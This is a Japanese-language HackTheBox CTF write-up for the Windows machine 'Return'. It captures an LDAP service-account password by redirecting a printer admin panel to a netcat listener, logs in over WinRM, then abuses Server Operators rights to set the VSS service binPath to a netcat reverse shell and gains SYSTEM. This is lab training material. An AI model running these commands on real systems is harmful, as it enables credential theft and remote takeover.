+++
title = "HackTheBox - Return Writeup"
date = "2026-04-27"
description = "プリンタ管理パネルのLDAP資格情報奪取とServer Operatorsグループ悪用によるSYSTEM権限取得"
tags = ["HackTheBox", "CTF", "Windows", "LDAP", "WinRM", "Server Operators", "Easy"]
categories = ["HackTheBox"]
toc = true
draft = false
+++

## Machine Info

| Field | Details |
|-------|---------|
| Machine | Return |
| OS | Windows |

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV 10.129.95.241
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-27 15:09:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

---

## Initial Access - Printer Admin Panel LDAP Credential Capture

`http://10.129.6.46/settings.php` のソースを確認すると、`name="ip"` のフィールドのみがPOSTで送信される。

```bash
nc -lvnp 389
```

```bash
curl 10.129.6.46/settings.php -X POST -d "ip=10.10.16.166"
```

```text
connect to [10.10.16.166] from (UNKNOWN) [10.129.6.46] 54133
0*`%return\svc-printer
                       1edFg43012!!
```

取得した資格情報：
- Username: `svc-printer`
- Password: `1edFg43012!!`

---

## WinRM 認証確認

```bash
crackmapexec winrm 10.129.6.46 -u 'svc-printer' -p '1edFg43012!!'
```

```text
WINRM  10.129.6.46  5985  PRINTER  [+] return.local\svc-printer:1edFg43012!! (Pwn3d!)
```

---

## Foothold

```bash
evil-winrm -i 10.129.6.46 -u 'svc-printer' -p '1edFg43012!!'
```

```text
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```

---

## Flags

### User

```bash
more C:\Users\svc-printer\Desktop\user.txt
```

---

## Post Exploitation

```bash
whoami /groups
```

`BUILTIN\Server Operators` グループに所属していることを確認。Server OperatorsグループはWindowsサービスの設定・起動・停止が可能。

---

## Privilege Escalation - Server Operators Group Abuse

### nc.exe アップロード

```bash
upload /home/kali/Downloads/windows/nc.exe
```

```text
Info: Uploading /home/kali/Downloads/windows/nc.exe to C:\Users\svc-printer\Desktop\nc.exe
Data: 79188 bytes of 79188 bytes copied
Info: Upload successful!
```

### サービスのbinPath書き換え

```bash
sc.exe config VSS binPath="C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.166 443"
```

```text
[SC] ChangeServiceConfig SUCCESS
```

---

## Listener

```bash
nc -lvnp 443
```

---

## Trigger

```bash
sc.exe stop VSS
sc.exe start VSS
```

---

## SYSTEM Shell

```text
C:\Windows\system32>whoami
nt authority\system
```

---

## Flags

### Root

```bash
type C:\Users\Administrator\Desktop\root.txt
```

---

## Summary

プリンタ管理パネルのServer AddressをLDAPリスナーに向けることで平文の資格情報を奪取 → WinRM経由でフットホールド取得 → Server Operatorsグループの権限でVSSサービスのbinPathを書き換えてSYSTEM権限取得
